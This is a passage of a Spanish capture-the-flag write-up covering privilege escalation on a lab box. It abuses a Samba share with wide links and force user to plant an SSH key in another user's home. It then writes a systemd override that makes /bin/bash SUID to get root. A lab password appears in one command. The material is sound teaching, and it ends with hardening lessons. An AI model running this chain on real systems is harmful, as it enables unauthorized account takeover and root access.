Escalada de Privilegios Link to heading

Análisis de la configuración Samba Link to heading

Revisamos la configuración de Samba para entender los shares y sus permisos:

scott@abducted:~$ cat /etc/samba/shares.conf
[HP-Reception]
   comment = Reception printer
   path = /var/spool/samba
   printable = yes
   guest ok = yes
   print command = /usr/local/bin/printaudit %J %s

[projects]
   comment = Hartley Group Project Files
   path = /srv/projects
   valid users = scott
   read only = no
   browseable = yes

[transfer]
   comment = Staff file transfer
   path = /srv/transfer
   valid users = scott
   force user = marcus
   read only = no
   wide links = yes
   browseable = yes

Dos detalles críticos:

  1. wide links = yes en el share transfer — permite seguir symlinks
  2. force user = marcus — los archivos se escriben como el usuario marcus

Esto permite un ataque de symlink para escribir la clave pública de Scott en el .ssh de Marcus.

Pivot a Marcus mediante symlink Link to heading

Creamos un symlink en /srv/transfer que apunte al home de Marcus:

scott@abducted:~$ ln -sf /home/marcus/ /srv/transfer/marcus_home

Generamos un par de llaves SSH y subimos authorized_keys a través del share:

scott@abducted:~$ ssh-keygen -t rsa -N ""
scott@abducted:~$ cat ~/.ssh/id_rsa.pub > authorized_keys
scott@abducted:~$ chmod 600 authorized_keys
scott@abducted:~$ smbclient //127.0.0.1/transfer/ -U scott%iXzvcib3SrpZ
smb: \> cd marcus_home
smb: \marcus_home\> mkdir .ssh
smb: \marcus_home\.ssh\> put authorized_keys

Nos conectamos como Marcus:

scott@abducted:~$ ssh marcus@localhost
marcus@abducted:~$ id

Abuso de grupo operators — systemd override Link to heading

Marcus pertenece al grupo operators. Buscamos archivos accesibles por este grupo:

marcus@abducted:~$ find / -group operators 2>/dev/null
/etc/systemd/system/smbd.service.d

El directorio /etc/systemd/system/smbd.service.d/ es writeable por el grupo operators. Esto permite crear un override de systemd que ejecute comandos como root cuando el servicio smbd se reinicie.

Creamos un override que otorga SUID a /bin/bash:

marcus@abducted:~$ cat > /etc/systemd/system/smbd.service.d/override.conf << 'EOF'
[Service]
ExecStart=
ExecStart=/bin/bash -c 'chmod u+s /bin/bash'
EOF
marcus@abducted:~$ systemctl daemon-reload
marcus@abducted:~$ systemctl restart smbd

A pesar del error aparente, el SUID se aplica:

marcus@abducted:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
marcus@abducted:~$ bash -p
bash-5.2# cat /root/root.txt
7872313c5857fade41ada24fe91c18e4

Root conseguido.

Lecciones aprendidas Link to heading

  1. No usar wide links = yes en shares Samba. Permite que un atacante cree symlinks a cualquier directorio del sistema y acceda a archivos de otros usuarios.
  2. force user en Samba redirige la escritura a otro usuario. Combinado con symlinks, un atacante puede escribir archivos de configuración o claves SSH de otros usuarios.
  3. Proteger directorios de systemd. El grupo operators no debería tener permisos de escritura en /etc/systemd/system/. Un override malicioso puede ejecutar código como root.
  4. Las contraseñas ofuscadas con rclone no son seguras. rclone reveal las descifra trivialmente.
  5. Sesiones nulas en Samba siguen siendo un vector de información valioso. El share HP-Reception expuso la superficie de ataque inicial.
